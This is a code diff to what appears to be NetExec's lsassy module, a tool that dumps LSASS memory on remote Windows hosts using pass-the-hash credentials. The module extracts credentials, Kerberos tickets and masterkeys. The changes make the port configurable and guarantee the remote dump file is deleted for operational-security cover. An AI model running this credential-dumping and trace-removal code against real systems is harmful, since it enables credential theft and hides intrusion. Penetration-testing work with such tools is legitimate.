@@ -67,7 +67,7 @@ class NXCModule:
         session.get_session(
             address=host,
             target_ip=host,
-            port=445,
+            port=connection.port,
             lmhash=lmhash,
             nthash=nthash,
             username=username,
@@ -89,23 +89,24 @@ class NXCModule:
             context.log.fail("Unable to dump lsass")
             return False
 
-        parsed = Parser(host, file).parse()
+        try:
+            parsed = Parser(host, file).parse()
+        finally:
+            # Delete the remote file even when parsing failed, and even if closing it fails
+            try:
+                file.close()
+                context.log.debug("Closed dumper file")
+            except Exception as e:
+                context.log.debug(f"Error closing dumper file: {e}")
+            if ImpacketFile.delete(session, file.get_file_path()):
+                context.log.debug("Deleted dumper file")
+            else:
+                context.log.fail(f"[OPSEC] Failed to delete lsassy dumper file: {file.get_file_path()}")
+
         if parsed is None:
             context.log.fail("Unable to parse lsass dump")
             return False
         credentials, tickets, masterkeys = parsed
-        file.close()
-        context.log.debug("Closed dumper file")
-        file_path = file.get_file_path()
-        context.log.debug(f"File path: {file_path}")
-        try:
-            deleted_file = ImpacketFile.delete(session, file_path)
-            if deleted_file:
-                context.log.debug("Deleted dumper file")
-            else:
-                context.log.fail(f"[OPSEC] No exception, but failed to delete file: {file_path}")
-        except Exception as e:
-            context.log.fail(f"[OPSEC] Error deleting temporary lsassy dumper file {file_path}: {e}")
 
         if credentials is None:
             credentials = []
@@ -187,7 +188,7 @@ class NXCModule:
                     context.log.fail(f"Error writing ticket {filename}: {e}")
 
         if ticket_count > 0:
-            context.log.highlight(f"Saved {ticket_count} Kerberos ticket(s) to {self.save_dir}")
+            context.log.success(f"Saved {ticket_count} Kerberos ticket(s) to {self.save_dir}")
         else:
             context.log.display("No tickets were saved")
 
